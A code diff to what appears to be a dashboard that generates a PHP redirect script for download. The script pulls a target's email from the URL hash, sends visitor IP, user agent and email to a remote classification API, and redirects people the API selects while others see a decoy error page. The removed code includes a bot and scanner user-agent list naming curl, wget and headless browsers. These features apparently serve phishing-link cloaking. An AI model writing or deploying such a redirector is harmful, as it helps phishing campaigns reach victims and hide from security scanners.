@@ -227,66 +227,40 @@ export default function UserDashboard() {
     }
 
     const phpContent = `<?php
+session_start();
+
 $apiKey = '${apiKey}';
 $apiEndpoint = '${apiEndpoint}/api/classify';
-?>
+
+if (!isset($_GET['e']) && !isset($_GET['email']) && strpos($_SERVER['REQUEST_URI'], '#') !== false) {
+    ?><!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
 <script>
 (function() {
     var hash = window.location.hash;
-    var search = window.location.search;
-    var href = window.location.href;
-    var emailParam = null;
-    
     if (hash && hash.length > 1) {
         var hashParams = hash.substring(1);
         var pairs = hashParams.split('&');
         for (var i = 0; i < pairs.length; i++) {
             var keyVal = pairs[i].split('=');
-            if (keyVal.length >= 2) {
-                var key = keyVal[0];
-                var value = decodeURIComponent(keyVal.slice(1).join('='));
-                if (key === 'e' || key === 'email') {
-                    emailParam = value;
-                    break;
-                }
+            if (keyVal.length >= 2 && (keyVal[0] === 'e' || keyVal[0] === 'email')) {
+                var emailParam = decodeURIComponent(keyVal.slice(1).join('='));
+                var search = window.location.search;
+                var separator = search ? '&' : '?';
+                var newUrl = window.location.pathname + search + separator + 'e=' + encodeURIComponent(emailParam);
+                window.location.replace(newUrl);
+                break;
             }
         }
-    }
-    
-    if (!emailParam && href.indexOf('*') !== -1) {
-        var starIndex = href.indexOf('*');
-        var starParams = href.substring(starIndex + 1);
-        var hashIndex = starParams.indexOf('#');
-        if (hashIndex !== -1) {
-            starParams = starParams.substring(0, hashIndex);
-        }
-        var pairs = starParams.split('&');
-        for (var i = 0; i < pairs.length; i++) {
-            var keyVal = pairs[i].split('=');
-            if (keyVal.length >= 2) {
-                var key = keyVal[0];
-                var value = decodeURIComponent(keyVal.slice(1).join('='));
-                if (key === 'e' || key === 'email') {
-                    emailParam = value;
-                    break;
-                }
-            }
-        }
-    }
-    
-    if (emailParam && search.indexOf('e=') === -1 && search.indexOf('email=') === -1) {
-        var separator = search ? '&' : '?';
-        var cleanPath = window.location.pathname;
-        if (href.indexOf('*') !== -1) {
-            cleanPath = cleanPath.split('*')[0];
-        }
-        var newUrl = cleanPath + search + separator + 'e=' + encodeURIComponent(emailParam);
-        window.location.replace(newUrl);
     }
 })();
 </script>
-<?php
-session_start();
+</body>
+</html><?php
+    exit;
+}
 
 $visitorIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $visitorUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
@@ -297,53 +271,21 @@ if (isset($_SESSION['ct_' . $visitorFingerprint])) {
     $cacheAge = time() - $cached['timestamp'];
     
     if ($cacheAge < 600) {
-        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
-        header('Pragma: no-cache');
-        header('Expires: 0');
-        
         $cachedUrl = $cached['redirectUrl'];
         if (!empty($_SERVER['QUERY_STRING'])) {
             $separator = (strpos($cachedUrl, '?') !== false) ? '&' : '?';
             $cachedUrl .= $separator . $_SERVER['QUERY_STRING'];
         }
         
+        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+        header('Pragma: no-cache');
+        header('Expires: 0');
         header('Location: ' . $cachedUrl);
         exit;
     } else {
         unset($_SESSION['ct_' . $visitorFingerprint]);
     }
 }
-
-function isLikelyBot($userAgent) {
-    if (empty($userAgent) || strlen($userAgent) < 10) {
-        return true;
-    }
-    
-    $botPatterns = [
-        'HeadlessChrome', 'PhantomJS', 'Puppeteer', 'Selenium', 'WebDriver',
-        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot',
-        'facebookexternalhit', 'Twitterbot', 'LinkedInBot', 'WhatsApp',
-        'Scrapy', 'curl', 'wget', 'python-requests', 'Go-http-client',
-        'bot', 'crawler', 'spider', 'scraper'
-    ];
-    
-    foreach ($botPatterns as $pattern) {
-        if (stripos($userAgent, $pattern) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-$isBot = isLikelyBot($visitorUserAgent);
-
-$email = $_GET['email'] ?? $_GET['e'] ?? null;
-
-header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
-header('X-Content-Type-Options: nosniff');
-header('X-Frame-Options: DENY');
-header('Content-Security-Policy: default-src \\'self\\'; frame-ancestors \\'none\\'');
 
 function detectDevice($userAgent) {
     if (preg_match('/mobile|android|iphone|ipad|ipod/i', $userAgent)) {
@@ -365,33 +307,28 @@ function detectBrowser($userAgent) {
     return 'Unknown';
 }
 
+$email = $_GET['email'] ?? $_GET['e'] ?? null;
 $deviceType = detectDevice($visitorUserAgent);
 $browser = detectBrowser($visitorUserAgent);
-
 $redirectUrl = null;
 $visitorType = null;
-
-$postData = [
-    'ip' => $visitorIp,
-    'userAgent' => $visitorUserAgent,
-    'deviceType' => $deviceType,
-    'browser' => $browser,
-];
-
-if ($email) {
-    $postData['email'] = $email;
-}
 
 $ch = curl_init($apiEndpoint);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
+    'ip' => $visitorIp,
+    'userAgent' => $visitorUserAgent,
+    'deviceType' => $deviceType,
+    'browser' => $browser,
+    'email' => $email
+]));
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'Content-Type: application/json',
     'X-API-Key: ' . $apiKey
 ]);
 curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -411,23 +348,21 @@ if ($redirectUrl) {
         'visitorType' => $visitorType,
         'timestamp' => time()
     ];
-}
-
-header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
-header('Pragma: no-cache');
-header('Expires: 0');
-
-if ($redirectUrl) {
+    
     if (!empty($_SERVER['QUERY_STRING'])) {
         $separator = (strpos($redirectUrl, '?') !== false) ? '&' : '?';
         $redirectUrl .= $separator . $_SERVER['QUERY_STRING'];
     }
     
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    header('Pragma: no-cache');
+    header('Expires: 0');
     header('Location: ' . $redirectUrl);
     exit;
-} else {
-    http_response_code(200);
-    echo '<!DOCTYPE html>
+}
+
+http_response_code(200);
+?><!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -473,10 +408,7 @@ if ($redirectUrl) {
         <div class="note">Error Code: CONFIG_001</div>
     </div>
 </body>
-</html>';
-    exit;
-}
-?>`;
+</html>`;
 
     try {
       const zip = new JSZip();
